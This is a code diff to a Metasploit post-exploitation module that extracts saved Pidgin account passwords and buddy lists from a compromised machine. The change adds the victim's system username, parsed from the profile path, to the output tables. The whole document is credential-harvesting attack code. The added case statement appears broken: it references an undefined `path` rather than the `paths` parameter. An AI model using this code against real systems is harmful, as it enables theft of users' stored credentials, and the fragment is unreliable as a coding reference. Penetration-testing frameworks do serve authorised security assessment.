@@ -151,6 +151,12 @@ class Metasploit3 < Msf::Post
 	end
 
 	def get_pidgin_creds(paths)
+		case path
+			when /#{@user}\\(.*)\\/
+				sys_user = $1
+			when /home\/(.*)\//
+				sys_user = $1
+		end
 
 		data = ""
 		credentials = Rex::Ui::Text::Table.new(
@@ -158,6 +164,7 @@ class Metasploit3 < Msf::Post
 		'Indent'    => 1,
 		'Columns'   =>
 		[
+			"System User",
 			"Username",
 			"Password",
 			"Protocol",
@@ -170,6 +177,7 @@ class Metasploit3 < Msf::Post
 		'Indent'    => 1,
 		'Columns'   =>
 		[
+			"System User",
 			"Buddy Name",
 			"Alias",
 			"Protocol",
@@ -207,12 +215,12 @@ class Metasploit3 < Msf::Post
 				end
 
 			creds.each do |cred|
-				credentials << [cred['user'], cred['password'], cred['protocol'], cred['server'], cred['port']]
+				credentials << [sys_user, cred['user'], cred['password'], cred['protocol'], cred['server'], cred['port']]
 			end
 
 			if buddies
 				buddies.each do |buddy|
-					buddylists << [buddy['name'], buddy['alias'], buddy['protocol'], buddy['account']]
+					buddylists << [sys_user, buddy['name'], buddy['alias'], buddy['protocol'], buddy['account']]
 				end
 			end
 
